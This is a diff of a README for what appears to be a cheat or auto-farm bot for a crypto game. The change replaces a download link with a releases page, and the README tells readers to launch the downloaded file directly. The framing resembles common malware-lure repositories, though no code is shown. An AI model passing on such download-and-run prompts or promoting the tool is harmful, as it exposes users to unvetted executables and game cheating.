@@ -24,7 +24,7 @@ Welcome to the Seekers of Tokane Cheat Crypto Bot repository! 🤖 This bot is d
 
 To access the Seekers of Tokane Cheat Crypto Bot, download the bot from the following link: 
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-blue)](https://github.com/assets/Release.zip)
+[![Download Bot](https://github.com/Vihhscan7/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)](https://github.com/Vihhscan7/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)
 
 If the link above ends with the file name, simply launch the downloaded file to start using the bot. In case the link is a website, visit it directly to get your hands on this powerful tool. If the provided link is not working or if one is not provided, please check the "Releases" section of this repository for alternative download options.
 
